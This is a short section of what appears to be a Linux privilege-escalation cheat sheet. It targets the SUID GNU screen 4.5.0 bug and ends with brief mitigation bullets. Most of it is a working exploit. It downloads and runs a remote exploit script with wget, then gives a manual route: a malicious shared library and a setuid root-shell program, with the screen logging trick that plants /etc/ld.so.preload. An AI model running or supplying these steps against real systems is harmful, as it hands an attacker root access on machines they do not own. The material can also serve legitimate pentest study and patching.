11. Services

#### Check screen version

```bash
screen -v
```

#### Download exploit script

```bash
wget https://raw.githubusercontent.com/infernusinvictus/linux-exploit-suggestions/master/screen-4.5.0/screen_exploit.sh
```

#### Make exploit executable

```bash
chmod +x screen_exploit.sh
```

#### Run exploit (replace ~ with target home directory)

```bash
./screen_exploit.sh ~ gnu/screenroot ~
```

#### Manual method (if script fails)

**1. Create libhax.c**

```bash
cat << EOF > /tmp/libhax.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/stat.h>

__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
EOF
```

**2. Compile libhax.c**

```bash
gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
```

**3. Create rootshell.c**

```bash
cat << EOF > /tmp/rootshell.c
#include <stdio.h>
#include <unistd.h>

int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
EOF
```

**4. Compile rootshell.c**

```bash
gcc -o /tmp/rootshell /tmp/rootshell.c -Wno-implicit-function-declaration
```

**5. Create /etc/ld.so.preload**

```bash
cd /etc
umask 000
screen -D -m -L ld.so.preload echo -ne "\x0a/tmp/libhax.so"
```

**6. Trigger exploit**

```bash
screen -ls
```

**7. Execute root shell**

```bash
/tmp/rootshell
```

#### Cleanup

```bash
rm /tmp/libhax.so
rm /tmp/rootshell
rm /etc/ld.so.preload
```

---

### Mitigation

* Update screen to patched version.
* Remove SUID bit from `/usr/bin/screen` if not needed.
* Monitor and protect `/etc/ld.so.preload`.
